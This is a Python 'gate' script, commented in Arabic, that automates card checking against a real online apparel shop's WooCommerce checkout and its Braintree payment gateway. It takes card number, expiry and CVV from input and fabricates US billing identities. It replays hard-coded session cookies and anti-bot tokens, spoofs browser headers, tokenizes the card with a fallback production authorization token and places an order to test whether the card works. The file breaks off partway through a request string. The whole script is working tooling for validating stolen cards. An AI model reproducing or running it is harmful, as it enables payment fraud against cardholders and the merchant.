# ==================== gatet.py (النسخة الجديدة لموقع RelentlessDefender) ====================

import requests, json, re, random, sys, os, time, base64, uuid
from requests_toolbelt.multipart.encoder import MultipartEncoder
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from user_agent import generate_user_agent
from bs4 import BeautifulSoup
import string

def clean_html(text):
    if not text:
        return ""
    clean = re.sub(r'<[^>]+>', ' ', text)
    clean = re.sub(r'\s+', ' ', clean)
    return clean.strip().lower()

def extract_reason(text):
    match = re.search(r'reason:\s*(.+?)(?:\.\s|$|<|$)', text, re.IGNORECASE)
    if match:
        return match.group(1).strip()
    return None

def generate_valid_us_data():
    """توليد بيانات عنوان أمريكي صالح"""
    first_names = ['James', 'Emma', 'Oliver', 'Amelia', 'Harry', 'Grace', 'George', 'Olivia', 'Jack', 'Sophie',
                   'William', 'Emily', 'Thomas', 'Jessica', 'Charlie', 'Lucy', 'Alfie', 'Isabella', 'Jacob', 'Mia',
                   'John', 'Jane', 'Michael', 'Sarah', 'David', 'Laura', 'Hoane', 'Kosi']
    last_names = ['Smith', 'Jones', 'Williams', 'Brown', 'Taylor', 'Davies', 'Wilson', 'Evans', 'Thomas', 'Johnson',
                  'Roberts', 'Walker', 'Wright', 'Robinson', 'Thompson', 'White', 'Hughes', 'Edwards', 'Green', 'Lewis',
                  'Caril', 'Hatleyb', 'Payne', 'Betran', 'Vane']
    
    first = random.choice(first_names)
    last = random.choice(last_names)
    
    us_states = ['CA', 'TX', 'FL', 'NY', 'IL', 'PA', 'OH', 'GA', 'NC', 'MI', 'NJ', 'VA', 'WA', 'AZ', 'MA', 'TN', 'IN', 'MO', 'MD', 'WI']
    us_cities = ['Los Angeles', 'Houston', 'Chicago', 'Brooklyn', 'Phoenix', 'Philadelphia', 'San Antonio', 'San Diego', 'Dallas', 'Austin', 'Rotherham']
    us_postcodes = ['90001', '77001', '60601', '11201', '85001', '19101', '78201', '92101', '75201', '73301']
    us_phones = ['2135551234', '7135551234', '3125551234', '7185551234', '6025551234', '2155551234', '12038783117', '441709382815']
    us_addresses = ['1 Rowe Ave', '123 Main Street', '456 Oak Avenue', '789 Pine Road', '321 Elm Street', '654 Maple Drive', '653 Broom Valley Rd']
    
    email_domains = ['@yahoo.com', '@hotmail.com', '@outlook.com', '@icloud.com', '@aol.com', '@gmail.com']
    email_domain = random.choice(email_domains)
    
    return {
        'first_name': first,
        'last_name': last,
        'email': f"{first.lower()}.{last.lower()}{random.randint(1,999)}{email_domain}",
        'phone': random.choice(us_phones),
        'address_1': random.choice(us_addresses),
        'city': random.choice(us_cities),
        'state': random.choice(us_states),
        'postcode': random.choice(us_postcodes),
        'company': f"{first}'s {random.choice(['Auto', 'Parts', 'Retail', 'Ltd', 'Shop'])}" if random.choice([True, False]) else ''
    }

def ch(ccx):
    print("\n" + "="*70)
    print("[DEBUG] STARTING NEW CHECK - RelentlessDefender")
    print("="*70)
    
    ccx = ccx.strip()
    n = ccx.split("|")[0]
    mm = ccx.split("|")[1]
    yy = ccx.split("|")[2]
    cvc = ccx.split("|")[3]
    
    if len(yy) == 2:
        yy = '20' + yy
    
    user = generate_user_agent()
    fake_data = generate_valid_us_data()
    session_id = str(uuid.uuid4())
    correlation_id = str(uuid.uuid4())[:24]
    r = requests.session()
    
    print(f"[1/6] Using User-Agent: {user[:50]}...")
    print(f"[1/6] Generated fake data: {fake_data['first_name']} {fake_data['last_name']}, {fake_data['email']}")
    
    # ================ القيم الثابتة من الريكويستات الجديدة ================
    CT_SFW_PASS_KEY = 'd81045e636fbb2be458a59812d20ba0e0'
    CT_CHECKJS = '412784006'
    APBCT_VISIBLE_FIELDS = 'eyIwIjp7InZpc2libGVfZmllbGRzIjoicXVhbnRpdHkiLCJ2aXNpYmxlX2ZpZWxkc19jb3VudCI6MSwiaW52aXNpYmxlX2ZpZWxkcyI6InlpdGhfd2Fwb19wcm9kdWN0X2lkIHlpdGhfd2Fwb19wcm9kdWN0X2ltZyB5aXRoX3dhcG9faXNfc2luZ2xlIF93cG5vbmNlIF93cF9odHRwX3JlZmVyZXIiLCJpbnZpc2libGVfZmllbGRzX2NvdW50Ijo1fX0='
    WOOCOMMERCE_SESSION = 't_775edb8b89b4d59cddb32964c2902e%7C1779459401%7C1779373001%7C%24generic%24OIh-myRTOnd-tkGHNPNqlDIJXvOR81QujysCRbGH'
    
    # ================ 1. ADD TO CART ================
    print("\n[2/6] Adding product to cart...")
    
    product_url = 'https://relentlessdefender.com/product/relentless-defender-koozie/'
    
    cookies_add = {
        'apbct_site_landing_ts': '1779286498',
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
        '__cf_bm': 'q5zwDmlkt6Q.YBLzNGgGGYDJKFFqJDZHzdsRaA.aku8-1779286498-1.0.1.1-GR8gFGvWBNi_UrQJeBDvwgou8L5oQZXM7CpNnR_H_Z8vtAsbTGlvVHQtyzgB5YvCGHU0LD1zh6r0fMY6tXYJ7ovaqh8crTbDX1YO6_G0GAk',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'ct_checkjs': CT_CHECKJS,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'unique_session_id': 'a745f2ff-01f7-4302-8743-8ae096272863',
        'ct_mouse_moved': 'true',
        'commercekit-nonce-value': '72c25b68de',
        'commercekit-nonce-state': '0',
        '_fbp': 'fb.1.1779286506441.457161318630096402',
        'ct_has_scrolled': 'true',
        'apbct_prev_referer': 'https%3A%2F%2Frelentlessdefender.com%2Fproduct%2Frelentless-defender-koozie%2F',
        'wp_woocommerce_session_458d4ca3bc4f7f1cca967894c172ad61': WOOCOMMERCE_SESSION,
        'commercekit_obp_view_ids': '789360%2C822232',
        'ct_ps_timestamp': '1779286618',
        'apbct_page_hits': '10',
        'sbjs_session': 'pgs%3D9%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fproduct%2Frelentless-defender-koozie%2F',
        'ct_pointer_data': '%5B%5D',
        'ct_fkp_timestamp': '1779286660',
    }
    
    files = {
        'yith_wapo_product_id': (None, '785'),
        'yith_wapo_product_img': (None, ''),
        'yith_wapo_is_single': (None, '1'),
        '_wpnonce': (None, '47574b9e99'),
        '_wp_http_referer': (None, '/product/relentless-defender-koozie/'),
        'quantity': (None, '1'),
        'add-to-cart': (None, '785'),
        'apbct_visible_fields': (None, APBCT_VISIBLE_FIELDS),
    }
    
    headers_add = {
        'authority': 'relentlessdefender.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'origin': 'https://relentlessdefender.com',
        'referer': product_url,
        'user-agent': user,
        'upgrade-insecure-requests': '1',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.post(product_url, headers=headers_add, files=files, cookies=cookies_add)
    print(f"[2/6] Add to cart status: {response.status_code}")
    
    if response.status_code != 200:
        return f'ADD_TO_CART_FAILED'
    
    # ================ 2. CHECKOUT PAGE ================
    print("\n[3/6] Accessing checkout page...")
    
    cookies_checkout = {
        'apbct_site_landing_ts': '1779286498',
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
        '__cf_bm': 'q5zwDmlkt6Q.YBLzNGgGGYDJKFFqJDZHzdsRaA.aku8-1779286498-1.0.1.1-GR8gFGvWBNi_UrQJeBDvwgou8L5oQZXM7CpNnR_H_Z8vtAsbTGlvVHQtyzgB5YvCGHU0LD1zh6r0fMY6tXYJ7ovaqh8crTbDX1YO6_G0GAk',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'ct_checkjs': CT_CHECKJS,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'unique_session_id': 'a745f2ff-01f7-4302-8743-8ae096272863',
        'ct_mouse_moved': 'true',
        'commercekit-nonce-value': '72c25b68de',
        'commercekit-nonce-state': '0',
        '_fbp': 'fb.1.1779286506441.457161318630096402',
        'ct_has_scrolled': 'true',
        'apbct_prev_referer': 'https%3A%2F%2Frelentlessdefender.com%2Fproduct%2Frelentless-defender-koozie%2F',
        'wp_woocommerce_session_458d4ca3bc4f7f1cca967894c172ad61': WOOCOMMERCE_SESSION,
        'commercekit_obp_view_ids': '789360%2C822232',
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': '37f96722f99c851ece19427eef0dafe0',
        'sbjs_session': 'pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fproduct%2Frelentless-defender-koozie%2F',
        'ct_pointer_data': '%5B%5D',
        'ct_ps_timestamp': '1779286700',
        'apbct_page_hits': '14',
    }
    
    headers_checkout = {
        'authority': 'relentlessdefender.com',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
        'accept-language': 'en-US,en;q=0.9',
        'referer': product_url,
        'user-agent': user,
        'upgrade-insecure-requests': '1',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    response = r.get('https://relentlessdefender.com/checkout/', headers=headers_checkout, cookies=cookies_checkout)
    print(f"[3/6] Checkout page status: {response.status_code}")
    
    if response.status_code != 200:
        return f'CHECKOUT_PAGE_FAILED'
    
    # ================ 3. EXTRACT TOKENS AND NONCES ================
    print("\n[4/6] Extracting tokens and nonces...")
    
    sec = re.search(r'wc-ajax=update_order_review[^"]*security[^"]*"?\s*value="([^"]+)"', response.text)
    if not sec:
        sec = re.search(r'update_order_review_nonce":"([^"]+)"', response.text)
    if sec:
        sec = sec.group(1)
        print(f"[4/6] Found update_order_review nonce: {sec[:20]}...")
    else:
        print("[4/6] WARNING: Could not find update_order_review nonce")
        sec = '951c414ed0'
    
    check_nonce = re.search(r'woocommerce-process-checkout-nonce[^"]*"?\s*value="([^"]+)"', response.text)
    if not check_nonce:
        check_nonce = re.search(r'woocommerce-process-checkout-nonce":"([^"]+)"', response.text)
    if check_nonce:
        check_nonce = check_nonce.group(1)
        print(f"[4/6] Found checkout nonce: {check_nonce[:20]}...")
    else:
        print("[4/6] WARNING: Could not find checkout nonce")
        check_nonce = '6607b26b34'
    
    # ================ 4. UPDATE ORDER REVIEW ================
    print("\n[5/6] Updating order review...")
    
    headers_update = {
        'authority': 'relentlessdefender.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://relentlessdefender.com',
        'referer': 'https://relentlessdefender.com/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_update = {'wc-ajax': 'update_order_review'}
    
    data_update = f'security={sec}&payment_method=braintree_cc&country=&state=&postcode=&city=&address=&address_2=&s_country=&s_state=&s_postcode=&s_city=&s_address=&s_address_2=&has_full_address=false&post_data=wc_order_attribution_source_type%3Dtypein%26wc_order_attribution_referrer%3D(none)%26wc_order_attribution_utm_campaign%3D(none)%26wc_order_attribution_utm_source%3D(direct)%26wc_order_attribution_utm_medium%3D(none)%26wc_order_attribution_utm_content%3D(none)%26wc_order_attribution_utm_id%3D(none)%26wc_order_attribution_utm_term%3D(none)%26wc_order_attribution_utm_source_platform%3D(none)%26wc_order_attribution_utm_creative_format%3D(none)%26wc_order_attribution_utm_marketing_tactic%3D(none)%26wc_order_attribution_session_entry%3Dhttps%253A%252F%252Frelentlessdefender.com%252Fcart%252F%26wc_order_attribution_session_start_time%3D2026-05-20%252014%253A15%253A00%26wc_order_attribution_session_pages%3D11%26wc_order_attribution_session_count%3D1%26wc_order_attribution_user_agent%3D{user}%26billing_first_name%3D%26billing_last_name%3D%26billing_company%3D%26billing_country%3D%26billing_address_1%3D%26billing_address_2%3D%26billing_city%3D%26billing_state%3D%26billing_postcode%3D%26billing_phone%3D%26billing_email%3D%26wc_apbct_email_id%3D%26bb30e59%3D0%26bb30e59%3D1%26e038059%3D%26shipping_first_name%3D%26shipping_last_name%3D%26shipping_company%3D%26shipping_country%3D%26shipping_address_1%3D%26shipping_address_2%3D%26shipping_city%3D%26shipping_state%3D%26shipping_postcode%3D%26order_comments%3D%26payment_method%3Dbraintree_cc%26braintree_cc_nonce_key%3D%26braintree_cc_device_data%3D%26braintree_cc_3ds_nonce_key%3D%26braintree_cc_config_data%3D%26braintree_paypal_nonce_key%3D%26braintree_paypal_device_data%3D%26braintree_applepay_nonce_key%3D%26braintree_applepay_device_data%3D%26woocommerce-process-checkout-nonce%3D{check_nonce}%26_wp_http_referer%3D%252Fcheckout%252F'
    
    response = r.post('https://relentlessdefender.com/', params=params_update, headers=headers_update, data=data_update)
    print(f"[5/6] Update order review status: {response.status_code}")
    
    # ================ 5. TOKENIZE CREDIT CARD ================
    print("\n[6/6] Tokenizing credit card...")
    
    # استخراج الـ authorization fingerprint من الـ response
    au = None
    client_token_match = re.search(r'data-client-token="([^"]+)"', response.text)
    if not client_token_match:
        client_token_match = re.search(r'var wc_braintree_client_token = \["(.*?)"\]', response.text)
    
    if client_token_match:
        client_token = client_token_match.group(1)
        print(f"[6/6] Found client token, decoding...")
        try:
            dec = base64.b64decode(client_token).decode('utf-8')
            au_match = re.search(r'"authorizationFingerprint":"(.*?)"', dec)
            if au_match:
                au = au_match.group(1)
                print(f"[6/6] Got authorization fingerprint: {au[:50]}...")
        except:
            pass
    
    # إذا لم نجد الـ fingerprint، نستخدم القيمة الثابتة من الريكويستات
    if not au:
        au = 'eyJraWQiOiIyMDE4MDQyNjE2LXByb2R1Y3Rpb24iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsImFsZyI6IkVTMjU2In0.eyJleHAiOjE3NzkzNzMxMDIsImp0aSI6IjJkNDc0ZGI5LWViYzYtNDdkZi05MTM3LWE0Nzk0Y2VkNjJjMyIsInN1YiI6InF6bjdiNTl6enJxN2duMzkiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6InF6bjdiNTl6enJxN2duMzkiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlLCJ2ZXJpZnlfd2FsbGV0X2J5X2RlZmF1bHQiOmZhbHNlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6Q2xpZW50U0RLIiwiQnJhaW50cmVlOkFYTyJdLCJvcHRpb25zIjp7Im1lcmNoYW50X2FjY291bnRfaWQiOiJyZWxlbnRsZXNzZGVmZW5kZXJhcHBhcmVsX2luc3RhbnQiLCJwYXlwYWxfY2xpZW50X2lkIjoiQVJEUThtcmJ6ekhwcFFKU1J6N21uUHFscEFDTDBYeE9wU0YtSFJjV095bTBDZzNPTHVSd3piZzJQOUJvckpoZDdMeExqS0tNWnFGdndWUU8ifX0.24lkRgjz-bF7fm3w_Xr3woBtVLxXYgVatxdUaGZ2NQVM2foYXnSrJ7RyRmu2fquCsrO5Eb5zM5xVg8jEXepZjA'
        print("[6/6] Using fallback authorization fingerprint")
    
    headers_token = {
        'authority': 'payments.braintree-api.com',
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'authorization': f'Bearer {au}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
        'user-agent': user,
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    token_data = {
        'clientSdkMetadata': {
            'source': 'client',
            'integration': 'dropin2',
            'sessionId': session_id,
        },
        'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear } } }',
        'variables': {
            'input': {
                'creditCard': {
                    'number': n,
                    'expirationMonth': mm,
                    'expirationYear': yy,
                    'cvv': cvc,
                },
                'options': {'validate': False},
            },
        },
        'operationName': 'TokenizeCreditCard',
    }
    
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers_token, json=token_data)
    print(f"[6/6] Tokenization status: {response.status_code}")
    
    try:
        tok = response.json()['data']['tokenizeCreditCard']['token']
        print(f"[6/6] Got token: {tok[:30]}...")
    except Exception as e:
        print(f"[6/6] Tokenization failed: {e}")
        return f'TOKENIZATION_FAILED'
    
    # ================ 6. FINAL CHECKOUT ================
    print("\n[7/7] Processing final checkout...")
    
    cookies_final = {
        'apbct_site_landing_ts': '1779286498',
        'apbct_site_referer': '0',
        'ct_sfw_pass_key': CT_SFW_PASS_KEY,
        '__cf_bm': 'q5zwDmlkt6Q.YBLzNGgGGYDJKFFqJDZHzdsRaA.aku8-1779286498-1.0.1.1-GR8gFGvWBNi_UrQJeBDvwgou8L5oQZXM7CpNnR_H_Z8vtAsbTGlvVHQtyzgB5YvCGHU0LD1zh6r0fMY6tXYJ7ovaqh8crTbDX1YO6_G0GAk',
        'sbjs_migrations': '1418474375998%3D1',
        'sbjs_current_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_first_add': 'fd%3D2026-05-20%2014%3A15%3A00%7C%7C%7Cep%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcart%2F%7C%7C%7Crf%3D%28none%29',
        'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
        'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
        'ct_checkjs': CT_CHECKJS,
        'ct_timezone': '3',
        'apbct_headless': 'false',
        'unique_session_id': 'a745f2ff-01f7-4302-8743-8ae096272863',
        'ct_mouse_moved': 'true',
        'commercekit-nonce-value': '72c25b68de',
        'commercekit-nonce-state': '0',
        '_fbp': 'fb.1.1779286506441.457161318630096402',
        'ct_has_scrolled': 'true',
        'wp_woocommerce_session_458d4ca3bc4f7f1cca967894c172ad61': WOOCOMMERCE_SESSION,
        'woocommerce_items_in_cart': '1',
        'woocommerce_cart_hash': '4988a1d4aee2617224427e20002b2513',
        'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Frelentlessdefender.com%2Fcheckout%2F',
        'ct_pointer_data': '%5B%5B290%2C313%2C54129%5D%2C%5B208%2C308%2C65165%5D%2C%5B242%2C323%2C66211%5D%2C%5B322%2C38%2C69677%5D%2C%5B365%2C285%2C75650%5D%2C%5B442%2C273%2C92897%5D%2C%5B299%2C290%2C97829%5D%2C%5B138%2C306%2C99934%5D%2C%5B172%2C299%2C100373%5D%2C%5B186%2C285%2C125338%5D%5D',
    }
    
    headers_final = {
        'authority': 'relentlessdefender.com',
        'accept': 'application/json, text/javascript, */*; q=0.01',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'origin': 'https://relentlessdefender.com',
        'referer': 'https://relentlessdefender.com/checkout/',
        'user-agent': user,
        'x-requested-with': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }
    
    params_final = {'wc-ajax': 'checkout'}
    
    data_final = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=(none)&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Frelentlessdefender.com%2Fcart%2F&wc_order_attribution_session_start_time=2026-05-20+14%3A15%3A00&wc_order_attribution_session_pages=11&wc_order_attribution_session_count=1&wc_order_attribution_user_agent={user}&billing_first_name={fake_data["first_name"]}&billing_last_name={fake_data["last_name"]}&billing_company=&billing_country=US&billing_address_1={fake_data["address_1"].replace(" ", "+")}&billing_address_2=&billing_city={fake_data["city"]}&billing_state={fake_data["state"]}&billing_postcode={fake_data["postcode"]}&billing_phone={fake_data["phone"]}&billing_email={fake_data["email"]}&wc_apbct_email_id=&bb30e59=0&bb30e59=1&e038059=&shipping_first_name=&shipping_last_name=&shipping_company=&shipping_country=&shipping_address_1=&shipping_address_2=&shipping_city=&shipping_state=&shipping_postcode=&order_comments=&shipping_method%5B0%5D=flat_rate%3A18&payment_method=braintree_cc&braintree_cc_nonce_key={tok}&braintree_cc_device_data=&braintree_cc_3ds_nonce_key=&braintree_cc_config_data=%7B%22environment%22%3A%22production%22%2C%22clientApiUrl%22%3A%22https%3A%2F%2Fapi.braintreegateway.com%3A443%2Fmerchants%2Fqzn7b59zzrq7gn39%2Fclient_api%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fassets.braintreegateway.com%22%2C%22analytics%22%3A%7B%22url%22%3A%22https%3A%2F%2Fclient-analytics.braintreegateway.com%2Fqzn7b59zzrq7gn39%22%7D%2C%22merchantId%22%3A%22qzn7b59zzrq7gn39%22%2C%22venmo%22%3A%22off%22%2C%22graphQL%22%3A%7B%22url%22%3A%22https%3A%2F%2Fpayments.braintree-api.com%2Fgraphql%22%2C%22features%22%3A%5B%22tokenize_credit_cards%22%5D%7D%2C%22applePayWeb%22%3A%7B%22countryCode%22%3A%22US%22%2C%22currencyCode%22%3A%22USD%22%2C%22merchantIdentifier%22%3A%22qzn7b59zzrq7gn39%22%2C%22supportedNetworks%22%3A%5B%22visa%22%2C%22mastercard%22%2C%22amex%22%2C%22discover%22%5D%7D%2C%22fastlane%22%3A%7B%22enabled%22%3Atrue%2C%22tokensOnDemand%22%3Anull%7D%2C%22challenges%22%3A%5B%22cvv%22%5D%2C%22creditCards%22%3A%7B%22supportedCardTypes%22%3A%5B%22Visa%22%2C%22Discover%22%2C%22JCB%22%2C%22MasterCard%22%2C%22American+Express%22%2C%22UnionPay%22%5D%7D%2C%22threeDSecureEnabled%22%3Afalse%2C%22threeDSecure%22%3Anull%2C%22paypalEnabled%22%3Atrue%2C%22paypal%22%3A%7B%22displayName%22%3A%22Relentless+Defender+Apparel%22%2C%22clientId%22%3A%22ARDQ8mrbzzHppQJSRz7mnPqlpACL0XxOpSF-HRcWOym0Cg3OLuRwzbg2P9BorJhd7LxLjKKMZqFvwVQO%22%2C%22assetsUrl%22%3A%22https%3A%2F%2Fcheckout.paypal.com%22%2C%22environment%22%3A%22live%22%2C%22environmentNoNetwork%22%3Afalse%2C%22unvettedMerchant%22%3Afalse%2C%22braintreeClientId%22%3A%22ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW%22%2C%22billingAgreementsEnabled%22%3Atrue%2C%22merchantAccountId%22%3A%22relentlessdefenderapparel_instant%22%2C%22payeeEmail%22%3Anull%2C%22currencyIsoCode%22%3A%22USD%22%7D%7D&braintree_paypal_nonce_key=&braintree_paypal_device_data=&braintree_applepay_nonce_key=&braintree_applepay_device_data=&woocommerce-process-checkout-nonce={check_nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review&apbct_visible_fields=eyIwIjp7InZpc2libGVfZmllbGRzIjoiYmlsbGluZ19maXJzdF9uYW1lIGJpbGxpbmdfbGFzdF9uYW1lIGJpbGxpbmdfY29tcGFueSBiaWxsaW5nX2NvdW50cnkgYmlsbGluZ19hZGRyZXNzXzEgYmlsbGluZ19hZGRyZXNzXzIgYmlsbGluZ19jaXR5IGJpbGxpbmdfc3RhdGUgYmlsbGluZ19wb3N0Y29kZSBiaWxsaW5nX3Bob25lIGJpbGxpbmdfZW1haWwgd2NfYXBiY3RfZW1haWxfaWQgc2hpcHBpbmdfZmlyc3RfbmFtZSBzaGlwcGluZ19sYXN0X25hbWUgc2hpcHBpbmdfY29tcGFueSBzaGlwcGluZ19jb3VudHJ5IHNoaXBwaW5nX2FkZHJlc3NfMSBzaGlwcGluZ19hZGRyZXNzXzIgc2hpcHBpbmdfY2l0eSBzaGlwcGluZ19zdGF0ZSBzaGlwcGluZ19wb3N0Y29kZSBvcmRlcl9jb21tZW50cyIsInZpc2libGVfZmllbGRzX2NvdW50IjoyMiwiaW52aXNpYmxlX2ZpZWxkcyI6IndjX29yZGVyX2F0dHJpYnV0aW9uX3NvdXJjZV90eXBlIHdjX29yZGVyX2F0dHJpYnV0aW9uX3JlZmVycmVyIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9jYW1wYWlnbiB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1fc291cmNlIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9tZWRpdW0gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NvbnRlbnQgd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2lkIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV90ZXJtIHdjX29yZGVyX2F0dHJpYnV0aW9uX3V0bV9zb3VyY2VfcGxhdGZvcm0gd2Nfb3JkZXJfYXR0cmlidXRpb25fdXRtX2NyZWF0aXZlX2Zvcm1hdCB3Y19vcmRlcl9hdHRyaWJ1dGlvbl91dG1f